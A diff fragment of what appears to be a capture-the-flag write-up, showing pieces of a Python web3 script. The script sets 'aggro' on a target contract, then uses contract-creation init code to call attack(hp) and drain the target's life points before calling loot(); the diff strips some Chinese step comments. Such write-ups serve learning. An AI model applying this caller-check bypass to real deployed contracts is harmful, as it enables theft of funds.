@@ -76,9 +76,7 @@ so，use the py below
 > chain_id = w3.eth.chain_id_**
 
 > **_print(“[*] account:”, acct.address)  
-> print(“[*] chain_id:”, chain_id)_**
-
-> **_# 1. EOA 先调用一次，设置 aggro = 你的钱包地址  
+> print(“[*] chain_id:”, chain_id)_** 
 > print(“[*] Setting aggro…”)  
 > tx = target.functions.attack(0).build_transaction({  
 >  “from”: acct.address,  
@@ -92,8 +90,6 @@ so，use the py below
 
 > **_hp = target.functions.lifePoints().call()  
 > print(“[*] HP before:”, hp)_**
-
-> **_# 2. 部署一段 init code：创建合约时由“合约地址”调用 target.attack(hp)  
 > selector = w3.keccak(text=”attack(uint256)”)[:4]  
 > calldata = selector + hp.to_bytes(32, “big”)_**
 
@@ -120,11 +116,8 @@ so，use the py below
 > }  
 > send_tx(tx)  
 > nonce += 1_**
-
 > **_hp = target.functions.lifePoints().call()  
 > print(“[*] HP after:”, hp)_**
-
-> **_# 3. loot  
 > print(“[*] Looting…”)  
 > tx = target.functions.loot().build_transaction({  
 >  “from”: acct.address,  
